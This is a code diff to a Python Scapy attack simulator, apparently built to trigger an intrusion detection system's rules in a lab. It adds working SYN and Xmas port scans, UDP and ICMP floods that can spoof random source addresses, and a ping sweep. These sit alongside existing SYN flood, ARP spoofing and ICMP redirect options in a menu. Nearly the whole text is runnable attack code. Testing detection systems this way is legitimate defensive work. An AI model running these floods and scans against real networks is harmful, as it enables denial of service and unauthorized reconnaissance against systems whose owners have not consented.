@@ -22,8 +22,8 @@ import subprocess
 
 try:
     from scapy.all import (
-        IP, TCP, ARP, Ether, ICMP,
-        send, sendp, srp, get_if_hwaddr,
+        IP, TCP, UDP, ARP, Ether, ICMP,
+        send, sendp, srp, sr1, get_if_hwaddr,
         RandIP, RandShort, getmacbyip, conf, get_if_list, get_if_addr
     )
 except ImportError:
@@ -215,12 +215,125 @@ def icmp_redirect(stop_event):
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 4 — TCP port scan (SYN) — exercises port_sweep / host_sweep detection
+# ─────────────────────────────────────────────────────────────────────────────
+def port_scan(stop_event):
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    ports = list(range(1, 1025))
+    print(f"[*] SYN port scan → {VICTIM_IP} (ports 1-1024) on {iface}")
+    sent = 0
+    for port in ports:
+        if stop_event.is_set():
+            break
+        send(IP(src=attacker_ip, dst=VICTIM_IP) / TCP(sport=RandShort(), dport=port, flags="S"),
+             verbose=False, iface=iface)
+        sent += 1
+        print(f"  [SCAN] probed {sent} ports", end="\r")
+        time.sleep(0.01)
+    print(f"\n[*] Port scan stopped — {sent} ports probed")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 5 — Xmas scan (FIN+PSH+URG) — exercises stealth_scan detection
+# ─────────────────────────────────────────────────────────────────────────────
+def xmas_scan(stop_event):
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    print(f"[*] Xmas scan (FIN/PSH/URG) → {VICTIM_IP} on {iface}")
+    sent = 0
+    for port in range(1, 513):
+        if stop_event.is_set():
+            break
+        send(IP(src=attacker_ip, dst=VICTIM_IP) / TCP(sport=RandShort(), dport=port, flags="FPU"),
+             verbose=False, iface=iface)
+        sent += 1
+        print(f"  [XMAS] sent {sent}", end="\r")
+        time.sleep(0.01)
+    print(f"\n[*] Xmas scan stopped — {sent} packets")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 6 — UDP flood — exercises udp_flood detection
+# ─────────────────────────────────────────────────────────────────────────────
+def udp_flood(stop_event):
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    dport = int(os.environ.get("UDP_FLOOD_PORT", "53"))
+    pps = int(os.environ.get("UDP_FLOOD_PPS", "100"))
+    burst = max(1, pps // 10)
+    print(f"[*] UDP flood → {VICTIM_IP}:{dport} on {iface} ({pps} pkt/s)")
+    total = 0
+    while not stop_event.is_set():
+        pkts = [IP(src=RandIP() if USE_SPOOFED_SRC else attacker_ip, dst=VICTIM_IP) /
+                UDP(sport=RandShort(), dport=dport) / (b"X" * 64) for _ in range(burst)]
+        send(pkts, verbose=False, iface=iface)
+        total += burst
+        print(f"  [UDP] sent {total:,}", end="\r")
+        time.sleep(burst / max(1, pps))
+    print(f"\n[*] UDP flood stopped — {total:,} datagrams")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 7 — ICMP flood — exercises icmp_flood detection
+# ─────────────────────────────────────────────────────────────────────────────
+def icmp_flood(stop_event):
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    pps = int(os.environ.get("ICMP_FLOOD_PPS", "100"))
+    burst = max(1, pps // 10)
+    print(f"[*] ICMP flood → {VICTIM_IP} on {iface} ({pps} pkt/s)")
+    total = 0
+    while not stop_event.is_set():
+        pkts = [IP(src=RandIP() if USE_SPOOFED_SRC else attacker_ip, dst=VICTIM_IP) /
+                ICMP() / (b"X" * 56) for _ in range(burst)]
+        send(pkts, verbose=False, iface=iface)
+        total += burst
+        print(f"  [ICMP] sent {total:,}", end="\r")
+        time.sleep(burst / max(1, pps))
+    print(f"\n[*] ICMP flood stopped — {total:,} packets")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 8 — Ping sweep — exercises ping_sweep / host discovery detection
+# ─────────────────────────────────────────────────────────────────────────────
+def ping_sweep(stop_event):
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    net = ipaddress.ip_network(LAB_SUBNET, strict=False)
+    print(f"[*] Ping sweep across {LAB_SUBNET} on {iface}")
+    sent = 0
+    for host in net.hosts():
+        if stop_event.is_set():
+            break
+        send(IP(src=attacker_ip, dst=str(host)) / ICMP(), verbose=False, iface=iface)
+        sent += 1
+        print(f"  [SWEEP] pinged {sent} hosts", end="\r")
+        time.sleep(0.02)
+    print(f"\n[*] Ping sweep stopped — {sent} hosts")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Menu
 # ─────────────────────────────────────────────────────────────────────────────
 ATTACKS = {
-    "1": ("SYN Flood",     syn_flood),
-    "2": ("ARP Spoofing",  arp_spoof),
-    "3": ("ICMP Redirect", icmp_redirect),
+    "1": ("SYN Flood",      syn_flood),
+    "2": ("ARP Spoofing",   arp_spoof),
+    "3": ("ICMP Redirect",  icmp_redirect),
+    "4": ("TCP Port Scan",  port_scan),
+    "5": ("Xmas Scan",      xmas_scan),
+    "6": ("UDP Flood",      udp_flood),
+    "7": ("ICMP Flood",     icmp_flood),
+    "8": ("Ping Sweep",     ping_sweep),
 }
 
 def main():
